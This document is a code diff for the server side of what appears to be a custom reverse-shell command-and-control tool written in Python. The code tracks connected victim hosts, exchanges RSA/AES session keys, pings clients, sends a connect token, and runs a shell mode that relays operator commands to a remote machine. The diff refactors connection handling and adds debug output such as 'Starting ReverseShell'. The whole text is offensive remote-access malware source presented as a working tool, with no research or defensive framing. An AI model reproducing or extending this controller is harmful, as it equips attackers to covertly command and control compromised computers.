@@ -2,6 +2,7 @@ from CryptoAC.Asymmetric.Rsa import RSA
 from CryptoAC.Symmetric.AcAes import AesCrypto
 from .Connection import Connection
 from .internalClient import InternalSocketClient
+from Tools.toolsF import randombyte
 import socket
 import time
 import threading
@@ -25,14 +26,16 @@ class Server(object):
         self.connections = {}
         self.istest = False
         self.testMsg = bytes([100])
-        self.sleepPerPing = 60 
+        self.sleepPerPing = 2 
         self.sleepPeriter = 2
         self._internalclient = InternalSocketClient()
         
     def __insertConnection__(self,addr):
-        if addr[0] not in self.connections:
-            with self.lock:
-                self.connections.append(addr[0])
+        self.connections[addr[0]] = {
+            'hostname':'aharon',
+            'connected':False
+        }
+
         
     def __rmConnections(self,ip):
         with self.lock:
@@ -41,7 +44,8 @@ class Server(object):
     
     
     def setCipher(self):
-        msg = self.connection.conn.recv(10000)
+        msg = self.connection.conn.recv(self.rsaBlock)
+        print(msg)
         key = self.rsa.decrypt(
             self.PrivateKey,
             msg
@@ -52,8 +56,9 @@ class Server(object):
 
     def ping(self, conn, timeout=5):
         try:
-            conn.settimeout(timeout), conn.send(self.testMsg)
-            response = conn.recv(1)
+            conn.send(self.testMsg)
+            conn.settimeout(timeout)
+            response = conn.recv(3)
             conn.settimeout(None)
             if response:
                 return True
@@ -61,18 +66,25 @@ class Server(object):
             pass
         return False
     
+    def __sendConnect__(self,conn,addr):
+        conn.send(
+            bytes([106, 125, 139, 23, 156, 162, 56, 40, 221, 20, 145, 82, 168, 87, 194, 241])
+        )
+        self.connectTo = None
+        self.connection.addr = addr
+        self.connection.conn = conn
+        self.connections[addr[0]]['connected']=True
+    
     
     def onConnect(self,conn,addr):
+        self.__insertConnection__(addr)
         while True:
+            print(self.connectTo)
             if self.connectTo == addr[0]:
-                conn.send(bytes(([106, 125, 139, 23, 156, 162, 56, 40, 221, 20, 145, 82, 168, 87, 194, 241])))
-                self.connectTo = None
-                self.connection.addr = addr
-                self.connection.conn = conn
-                self.connections[addr[0]]['connected']=True
+                self.__sendConnect__(conn,addr)
                 self.__handleWhileConnected__(addr[0])
             elif not self.ping(conn):
-                print(True)
+                print('NotPing')
                 conn.close(), self.__rmConnections(addr[0])
                 return
             time.sleep(self.sleepPeriter)
@@ -115,11 +127,13 @@ class Server(object):
     def _setShellMode(self):
         while True:
             if self.connection.conn:
+                print('Satrting RevrseShell...')
                 self.setCipher()
                 self.connection.reset()
                 while True:
                     command = self.readCommand()
                     if command == 'exit':
+                        self.connections[self.connection.addr]['connected']=False
                         self.connection = Connection()
                         break
                     self.outResult()
@@ -136,8 +150,6 @@ class Server(object):
         while True:
             conn, addr = self.server.accept()
             print("Accept Connection.")
-            self.connections[addr[0]] = {'hostname':'aharon','connected':False}
-            print(self.connections)
             threading.Thread(
                 target=self.onConnect,
                 args=(conn,addr)
